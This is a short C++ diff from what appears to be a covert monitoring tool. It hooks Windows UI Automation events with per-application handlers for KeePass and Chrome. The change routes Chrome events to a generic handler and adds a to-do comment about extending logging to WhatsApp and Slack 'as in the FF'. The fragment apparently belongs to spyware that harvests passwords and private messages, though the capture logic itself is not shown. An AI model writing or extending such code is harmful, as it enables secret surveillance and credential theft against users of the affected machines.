@@ -346,5 +346,7 @@ void MyPropertyChangedEventHandler::HandleKeepass(IUIAutomationElement* pAutomat
 
 void MyPropertyChangedEventHandler::HandleChrome(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsDate, PROPERTYID propId, VARIANT vVar)
 {
-	//Log(L"HandleChrome() in Property Invoked", DBG);
+	//Log(Todo///////
+	// u can make logging whatsapp and slack as in the FF i've made
+	MyPropertyChangedEventHandler::HandleOther(pAutomationElement, wsProcName, wsDate, propId, vVar);
 }
